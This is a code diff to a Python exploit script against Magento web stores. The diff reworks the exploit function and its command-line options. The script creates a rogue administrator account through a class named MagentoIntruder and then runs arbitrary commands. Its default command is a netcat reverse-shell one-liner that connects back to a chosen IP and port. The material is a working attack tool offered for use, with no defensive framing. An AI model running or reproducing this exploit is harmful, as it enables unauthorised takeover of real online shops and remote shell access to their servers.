@@ -132,8 +132,8 @@ class MagentoIntruder:
                 self.print_success_text(f"Got answer: {e.read().decode()}")
 
 
-def exploit(base_path: str, login_url: str, bind_ip: str, bind_port: int, cmd: str):
-    intruder = SwagShopIntruder(admin_login_url=login_url, domain=base_path)
+def exploit(base_path: str, login_url: str, cmd: str):
+    intruder = MagentoIntruder(admin_login_url=login_url, domain=base_path)
     username, password = intruder.create_admin_user()
     if username is not None and password is not None:
         intruder.run_cmd(cmd, username, password)
@@ -149,15 +149,9 @@ if __name__ == "__main__":
         "--base-path", help="Base path of the Magento instance machine", required=True
     )
     parser.add_argument("--login-url", help="Admin login URL", default="admin")
+    parser.add_argument("--ip", help="IP address to bind the reverse shell")
     parser.add_argument(
-        "--ip", help="IP address to bind the reverse shell", required=True
-    )
-    parser.add_argument(
-        "--port",
-        help="Port to bind the reverse shell",
-        required=True,
-        type=int,
-        default=9000,
+        "--port", help="Port to bind the reverse shell", type=int, default=9000
     )
     parser.add_argument(
         "--cmd",
@@ -166,8 +160,12 @@ if __name__ == "__main__":
     )
 
     args = parser.parse_args()
+
+    if args.cmd is None and args.ip is None:
+        parser.error("You must specify either a command or an IP address to bind the reverse shell")
+
     cmd = (
         args.cmd
         or f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {args.ip} {args.port} >/tmp/f"
     )
-    exploit(args.base_path, args.login_url, args.ip, args.port, cmd)
+    exploit(args.base_path, args.login_url, cmd)
